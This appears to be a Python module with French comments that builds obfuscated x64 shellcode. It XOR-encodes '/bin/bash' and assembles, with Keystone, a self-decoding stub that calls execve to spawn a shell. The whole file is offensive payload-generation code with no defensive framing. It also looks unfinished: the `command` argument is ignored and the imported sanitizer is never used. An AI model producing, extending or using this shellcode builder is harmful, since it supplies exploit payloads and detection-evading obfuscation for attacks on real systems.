from keystone import *
import struct
from .utils import sanitize_command

def encode_string(s: str, xor_key: int = 0xB6) -> tuple[list[int], int]:
    """
    Encode une chaîne en valeurs numériques XORées.
    Retourne les valeurs encodées et la longueur.
    """
    # Padding à 8 bytes
    padded = s.encode() + b'\x00' * (8 - (len(s) % 8))
    length = len(s)
    
    # XOR chaque byte
    encoded = [b ^ xor_key for b in padded]
    
    # Convertir en valeurs 64-bits
    values = []
    for i in range(0, len(encoded), 8):
        chunk = encoded[i:i+8]
        value = int.from_bytes(bytes(chunk), 'little')
        values.append(value)
    
    return values, length

def generate_shellcode(command: str, arch: str = 'x64', xor_key: int = 0xB6) -> bytes:
    """
    Génère un shellcode à partir d'une commande shell.
    
    Args:
        command: La commande à exécuter
        arch: Architecture cible ('x86' ou 'x64')
        xor_key: Clé XOR pour l'obfuscation
    
    Returns:
        bytes: Le shellcode généré
    """
    if arch == 'x64':
        # Encoder /bin/bash
        shell_path = "/bin/bash"
        shell_values, shell_len = encode_string(shell_path, xor_key)
        
        # Template amélioré avec décodage XOR intégré
        asm = f"""
            bits 64
            
            initshellcode:
                xor rax, rax
                ;push rax            ; NULL terminator envp
                ;mov rdx, rsp        ; rdx = envp
                
                ;push rax            ; NULL terminator argv
        """
        
        # Ajouter les valeurs encodées
        for value in reversed(shell_values):
            asm += f"""
                mov rdi, {hex(value)}
                push rdi
            """
        
        asm += f"""
                mov rdi, rsp        ; rdi = ptr vers la chaîne encodée
                jmp xorshellcode
                
            shellcodeExecution:
                xor rax, rax
                push rax            ; NULL
                mov rdx, rsp        ; rdx = envp
                push rdi            ; ptr vers la chaîne décodée
                mov rsi, rsp        ; rsi = argv
                
                mov al, 59          ; execve
                syscall
                
            xorshellcode:
                xor byte [rdi+rax], {hex(xor_key)}
                cmp rax, {hex(shell_len)}
                je shellcodeExecution
                inc rax
                jmp xorshellcode
        """
        print(asm)
    else:
        raise NotImplementedError(f"Architecture {arch} non supportée pour le moment")

    try:
        # Initialiser Keystone pour x64
        ks = Ks(KS_ARCH_X86, KS_MODE_64)
        
        # Assembler le code
        encoding, count = ks.asm(asm)
        
        return bytes(encoding)
    except KsError as e:
        raise Exception(f"Erreur d'assemblage : {str(e)}")